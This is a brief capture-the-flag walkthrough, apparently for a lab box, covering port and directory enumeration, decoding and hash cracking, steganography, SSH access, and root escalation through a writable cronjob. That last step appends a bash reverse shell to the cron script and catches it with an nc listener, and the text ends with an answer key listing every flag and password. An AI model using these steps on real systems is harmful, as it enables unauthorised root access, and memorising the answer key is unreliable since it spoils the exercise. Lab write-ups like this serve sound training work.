---
Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.
---

### rustscan

>port 80,6498,65524

`NGINX es un servidor web open source de alta performance que ofrece el contenido estático de un sitio web de forma rápida y fácil de configurar. Ofrece recursos de equilibrio de carga, proxy inverso y streaming, además de gestionar miles de conexiones simultáneas.`

### gobuster
```
gobuster dir --url http://10.10.60.150 -w /usr/share/wordlists/dirb/common.txt -t 30 -k -x py,html,txt
```

>found hidden then whatever paths

### cyberchef

`ZmxhZ3tmMXJzN19mbDRnfQ==` *recipe from base64*

`a18672860d0510e5ab6699730763b250` *found 10.10.60.150:65524/robots.txt*
[md5hashing](https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250)

`sourcode 10.10.60.150:65524` *flag{9fdafbd64c47471a8f54cd3fc64cd312}*

> its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu

==from base62 /n0th1ng3ls3m4tt3r==

### john

==hash found in hidden dir -> 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81==
```
john --wordlist=/home/kali/Downloads/easypeasy/easypeasy.txt hash --format=GOST
```

`mypasswordforthatjob`

### steghide

> download the matrix img

```
steghide extract -sf binarycodepixabay.jpg
```

```
cat secrettext.txt
```

>username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001

`cyberchef -> boring:iconvertedmypasswordtobinary`

### ssh

```
ssh boring@10.10.60.150 -p 6498
```

> found synt{a0jvgf33zfa0ez4y} -> rot13 `flag{n0wits33msn0rm4l}`

### priv esc

```
cat /etc/crontab
```
>There is an interesting cron job being run .mysecretcronjob.sh every minute. We can see that it is being run by root.

```
ls -all /var/www/.mysecretcronjob.sh 
```

>-rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh

[revshells](https://www.revshells.com/)
```
echo 'bash -i >& /dev/tcp/10.18.1.00/4444 0>&1' >> /var/www/.mysecretcronjob.sh
```

`kali machine`

```
rlwrap nc -nlvp 4444 
```

```
cd /root
```

```
ls -all
```
>found it .root.txt > flag{63a9f0ea7bb98050796b649e85481845}
- How many ports are open? *3*
- What is the version of nginx?*1.16.1*
- What is running on the highest port?*Apache*
- Using GoBuster, find flag 1.*flag{f1rs7_fl4g}*
- Further enumerate the machine, what is flag 2?*flag{1m_s3c0nd_fl4g}*
- Crack the hash with easypeasy.txt, What is the flag 3?*flag{9fdafbd64c47471a8f54cd3fc64cd312}*
- What is the hidden directory?*/n0th1ng3ls3m4tt3r*
- Using the wordlist that provided to you in this task crack the hash what is the password? *mypasswordforthatjob*
- What is the password to login to the machine via SSH?*iconvertedmypasswordtobinary*
- What is the user flag?*flag{n0wits33msn0rm4l}*
- What is the root flag? *flag{63a9f0ea7bb98050796b649e85481845}*



